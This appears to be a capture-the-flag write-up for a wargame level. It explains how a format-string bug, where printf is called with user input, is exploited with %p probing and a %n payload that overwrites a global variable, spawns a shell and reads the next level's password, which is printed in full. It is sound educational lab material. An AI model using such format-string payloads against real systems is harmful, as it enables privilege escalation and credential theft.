# Level3

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./level3
  teststring
  teststring
```

> It looks like this is similar to the previous level...

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). At first glance it appears that a **buffer overflow** won't be possible here since the program uses [`fgets()`](https://linux.die.net/man/3/fgets) and reads up to **512** bytes while the buffer is **520** bytes long.

There is a built-in way to spawn a shell and for this a global variable on which we have no apparent control must equal **64**. After deeper dive into the code we can see that the output of `fgets()` is directly passed as first and only argument to a [`printf()`](https://linux.die.net/man/3/printf) call. According to the documentation, this usage of `printf()` can be exploited...

> Code such as `printf(foo);` often indicates a bug, since foo may contain a `%` character. If foo comes from untrusted user input, it may contain `%n`, causing the `printf()` call to write to memory and creating a security hole.

Using this vulnerability, we can arbitrarily set the global variable to the right value to spawn the shell. In order to do this, we'll need to set a **format string** that would updates the value stored in the address of this variable.

The process is a bit tricky:
- Get the variable address (Thanks to our `gdb` analysis we know it's `0x0804988c`)
- Use multiple `%p` to identify which stack parameter is the variable.
- Add the correct amount of character to the format string and using `%n` update the value of the variable by the number of characters.

```shell
  $> python -c 'print "AAAA" + " %p" * 8' | ./level3
  AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
```

> By appending `%p` identifiers we can find the position of the format string in the stack. In our case it is the 4th one because `AAAA` is `41414141` is hexadecimal.

Now that we know the format string position in the stack all we have to do is to create a **64** character long string containing the address of the variable involved in the condition to spawn the shell and output this length to its address using `%n`.

```
(python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60c%4$n"'; cat) | ./level3     
                                                         512
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

> We, first, write the address of the variable, which is already **4** bytes, so using `%60c` will add **60** spaces as padding resulting in a **64** character long string. Then all we have to do is output the number of character printed until this point using `%n` into the 4th positional argument which is indeed the address of the variable we want to change using `%4$`.

So next user credentials pair is `level4:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`.

Check [here](./source.c) for reproduction source-code of this binary.